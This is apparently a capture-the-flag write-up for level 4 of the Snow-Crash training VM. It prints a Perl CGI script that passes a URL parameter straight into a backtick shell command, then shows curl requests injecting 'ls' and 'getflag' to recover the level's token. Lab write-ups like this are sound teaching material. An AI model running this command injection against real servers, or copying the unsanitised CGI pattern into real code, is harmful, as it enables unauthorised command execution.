# Flag 04

- Access to Snow-Crash VM using level04/qi0maab88jeaj46qoumi7maus credentials
```
e1r9p7% ssh -p 4242 level04@10.11.100.146
```

- `ll`
```
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
```

- `cat level04.pl `
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

- It's a perl code that take redirect stdout and stderr to same output, and exec the x var
> https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean
> https://stackoverflow.com/questions/11255447/what-does-mean/11255498

- Try to pass a x param
```
level04@SnowCrash:~$ curl http://10.11.100.146:4747/?x=test
test
```

- Try to pass arry
```
level04@SnowCrash:~$ curl http://10.11.100.146:4747/?[]x=test
curl: (3) [globbing] illegal character in range specification at pos 29
```

- Try to pass cmd in whitin backticks
```
level04@SnowCrash:~$ curl http://10.11.100.146:4747/?x=`ls`
level04.pl
```

- Very goooood, it works, so try to pass getflag cmd
```
level04@SnowCrash:~$ curl http://10.11.100.146:4747/?x=`getflag`
Check
curl: (6) Couldn't resolve host 'flag.Here'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'your'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host ''
curl: (6) Couldn't resolve host 'Nope'
curl: (6) Couldn't resolve host 'there'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'no'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host 'here'
curl: (6) Couldn't resolve host 'for'
curl: (6) Couldn't resolve host 'you'
curl: (6) Couldn't resolve host 'sorry.'
curl: (6) Couldn't resolve host 'Try'
curl: (6) Couldn't resolve host 'again'
curl: (6) Couldn't resolve host ''
```

- Try in Browser
```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```